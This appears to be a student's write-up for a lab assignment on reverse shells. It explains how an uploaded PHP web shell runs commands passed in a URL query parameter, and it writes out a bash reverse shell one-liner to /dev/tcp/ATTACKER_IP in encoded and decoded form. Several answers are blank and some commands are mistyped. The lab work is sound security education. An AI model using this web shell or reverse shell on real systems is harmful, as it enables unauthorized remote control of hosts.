# Reverse Shell Assignment

## PART 1

A. We can execute the command whoami using the PHP shell script we uploaded the the '/uploadedimages/' endpoint earlier. We do this by sending a request to 'http://danger.jeffondich.com/uploadedimages?command=whoami'. That this does is it sends a query parameter named command with a value of whoami. Our uploaded script uses this query parameter and executes the command on the host machine. Because we wrap the PHP command in the '<pre>' tag the exact output of the command is returned. 

B. The pre tag means that what ever is inside should be formatted exactly as given. Without this we would not see the expected formatting of a terminal command output.

## PART 2


## PART 3

## PART 4

A. Once the webshell is set up I can simply run the ifconfig command and see the ip address is 192.168.64.2. To get the IP address before the reverse shell is set up I would need access to the kali machine to run this command. In the case it has a domain I could also run a DNS lookup of the domain name. 

B. My IP address is 172.20.10.7 I found this by running 'ipcondif getifaddr en0'. We should use the host IP in this case. (Why)

C. I choose 5000

D. 

E. Yes. We can run specific commands to figure out the local of the connection for instance 'ifconfig', in this case we see the IP matches the Kali intance.

F. The % in the URL are denoting URL encoded information. For the given long url what we are doing is running the 'bach -c "bash -h >& /dev/tcp/host_ip/host_port/ 0>&1' in which we ran in the last excersise. In this case we do not need to run this command on the kali machine as this command is being run through the reverse shell we created with the PHP script.

G. In this case the following is happening. Lets assume that we already have the reverse shell PHP script installed in the /var/html/ directory and the apache server is running on port 80. When we initiate the http request we are sending the command 'command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22' to the PHP shell script. This is decoded to the command 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"' and is run on the kali machine. This command now forwards the result of the bash command to the /dev/tcp/act_IP/act_port/ folder. This sends the information in the folder through the TCP connection to the corresponding ip and port. Our attacking machine is listening to this port meaning that we now created a reverse shell through the PHP script placed in the web server.
